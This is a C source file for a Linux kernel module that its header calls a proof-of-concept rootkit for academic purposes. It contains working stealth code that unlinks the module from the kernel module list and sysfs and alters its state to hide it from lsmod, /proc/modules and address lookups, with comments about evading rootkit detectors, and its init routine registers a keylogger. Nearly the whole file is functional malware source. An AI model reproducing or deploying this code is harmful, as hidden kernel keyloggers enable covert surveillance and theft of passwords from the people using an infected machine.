#include <linux/init.h>
#include <linux/kernel.h>

#include "util.h"
#include "keylogger.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("arm1nt");
MODULE_DESCRIPTION("POC rootkit for academic purposes only!");


static short hidden = 0;

static struct list_head *prev;


static void hide_me(void)
{
    if (hidden) return;

    //1. Hide from /proc/modules (and therefore also lsmod)
    //TODO: maybe implement a custom delete from list function
    //  to throw off root kit detection tools that look for POISON_I
    prev = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);

    //2. Hide from /sys/module
    //TODO: save data needed to undo this operation
    kobject_del(&THIS_MODULE->mkobj.kobj);

    //3. Hide from /proc/vmallocinfo
    //TODO: do

    //4. This way __module_address should always return NULL instead of the actual address (set module state to loading)
    THIS_MODULE->state = MODULE_STATE_UNFORMED;

    hidden = 1;
}

static void un_hide_me(void)
{
    //add to module list, so the module can be seen again and also removed with rmmod.
    list_add(&THIS_MODULE->list, prev);

    THIS_MODULE->state = MODULE_STATE_LIVE;
}


static int __init rootkit_init(void)
{
    pr_info("Loading rootkit\n");

    register_keylogger();

    return 0;
}


static void __exit rootkit_exit(void)
{
    pr_info("Unloading rootkit\n");

    unregister_keylogger();
}


module_init(rootkit_init);
module_exit(rootkit_exit);